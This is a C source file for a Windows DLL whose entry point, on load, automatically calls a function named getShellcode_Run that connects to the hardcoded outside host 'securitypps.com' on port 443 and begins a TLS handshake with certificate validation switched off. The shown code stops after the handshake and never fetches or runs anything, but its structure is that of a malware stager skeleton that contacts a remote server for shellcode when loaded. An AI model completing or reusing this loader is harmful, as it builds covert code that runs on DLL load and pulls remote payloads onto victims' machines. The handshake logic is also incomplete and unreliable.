#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <sspi.h>
#include <schannel.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")

#define SSL_BUFFER_SIZE 32768

// Debugging function to log information
void DebugOutput(const char* format, ...) {
    char buffer[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    OutputDebugStringA(buffer);
}

// Cleanup function for resources
void cleanup(SOCKET* ConnectSocket, CredHandle* hCred, CtxtHandle* hContext) {
    if (hContext->dwLower || hContext->dwUpper) {
        DeleteSecurityContext(hContext);
    }
    if (hCred->dwLower || hCred->dwUpper) {
        FreeCredentialsHandle(hCred);
    }
    if (*ConnectSocket != INVALID_SOCKET) {
        closesocket(*ConnectSocket);
        *ConnectSocket = INVALID_SOCKET;
    }
    WSACleanup();
}

// Function to perform the TLS handshake
void getShellcode_Run(char* host, char* port, char* resource) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL, hints = { 0 };
    CredHandle hCred = { 0 };
    CtxtHandle hContext = { 0 };
    DWORD dwFlags = ISC_REQ_CONFIDENTIALITY | ISC_REQ_STREAM;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        DebugOutput("WSAStartup failed\n");
        return;
    }

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve server address
    if (getaddrinfo(host, port, &hints, &result) != 0) {
        DebugOutput("getaddrinfo failed\n");
        WSACleanup();
        return;
    }

    ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        DebugOutput("Socket creation failed\n");
        freeaddrinfo(result);
        WSACleanup();
        return;
    }

    if (connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        DebugOutput("Connection failed\n");
        closesocket(ConnectSocket);
        freeaddrinfo(result);
        WSACleanup();
        return;
    }
    freeaddrinfo(result);

    // Set up SCHANNEL_CRED
    SCHANNEL_CRED schannelCred = { 0 };
    schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;  // Enable TLS 1.2 and 1.3
    schannelCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;

    // Acquire credentials handle
    SECURITY_STATUS secStatus = AcquireCredentialsHandleA(
        NULL,
        UNISP_NAME_A,
        SECPKG_CRED_OUTBOUND,
        NULL,
        &schannelCred,
        NULL,
        NULL,
        &hCred,
        NULL
    );

    if (secStatus != SEC_E_OK) {
        DebugOutput("AcquireCredentialsHandle failed: 0x%08X\n", secStatus);
        cleanup(&ConnectSocket, &hCred, &hContext);
        return;
    }

    // Initialize Security Context for TLS handshake
    SecBufferDesc outBuffer;
    SecBuffer outBuffers[1];
    outBuffers[0].pvBuffer = NULL;
    outBuffers[0].BufferType = SECBUFFER_TOKEN;
    outBuffers[0].cbBuffer = 0;
    outBuffer.cBuffers = 1;
    outBuffer.pBuffers = outBuffers;
    outBuffer.ulVersion = SECBUFFER_VERSION;

    secStatus = InitializeSecurityContextA(
        &hCred,
        NULL,
        host,
        dwFlags,
        0,
        0,
        NULL,
        0,
        &hContext,
        &outBuffer,
        &dwFlags,
        NULL
    );

    if (secStatus == SEC_I_CONTINUE_NEEDED) {
        DebugOutput("TLS handshake continuation required\n");
        send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
        FreeContextBuffer(outBuffers[0].pvBuffer);

        // Wait for server response
        char sslBuf[SSL_BUFFER_SIZE] = { 0 };
        int sslBufLen = recv(ConnectSocket, sslBuf, sizeof(sslBuf), 0);
        if (sslBufLen <= 0) {
            DebugOutput("recv failed: %d\n", WSAGetLastError());
            cleanup(&ConnectSocket, &hCred, &hContext);
            return;
        }

        DebugOutput("Received %d bytes during handshake\n", sslBufLen);

        SecBufferDesc inBuffer;
        SecBuffer inBuffers[2];
        inBuffers[0].pvBuffer = sslBuf;
        inBuffers[0].cbBuffer = sslBufLen;
        inBuffers[0].BufferType = SECBUFFER_TOKEN;
        inBuffers[1].BufferType = SECBUFFER_EMPTY;
        inBuffer.cBuffers = 2;
        inBuffer.pBuffers = inBuffers;
        inBuffer.ulVersion = SECBUFFER_VERSION;

        outBuffers[0].pvBuffer = NULL;
        outBuffers[0].BufferType = SECBUFFER_TOKEN;
        outBuffers[0].cbBuffer = 0;

        secStatus = InitializeSecurityContextA(
            &hCred,
            &hContext,
            NULL,
            dwFlags,
            0,
            0,
            &inBuffer,
            0,
            &hContext,
            &outBuffer,
            &dwFlags,
            NULL
        );

        if (secStatus == SEC_E_OK) {
            DebugOutput("TLS handshake completed successfully\n");
        } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
            DebugOutput("Incomplete message, waiting for more data...\n");
        } else {
            DebugOutput("InitializeSecurityContext failed: 0x%08X\n", secStatus);
        }
    } else {
        DebugOutput("InitializeSecurityContext failed: 0x%08X\n", secStatus);
    }

    cleanup(&ConnectSocket, &hCred, &hContext);
}

// DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    char host[] = "securitypps.com";
    char port[] = "443";
    char resource[] = "";
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        getShellcode_Run(host, port, resource);
        break;
    }
    return TRUE;
}
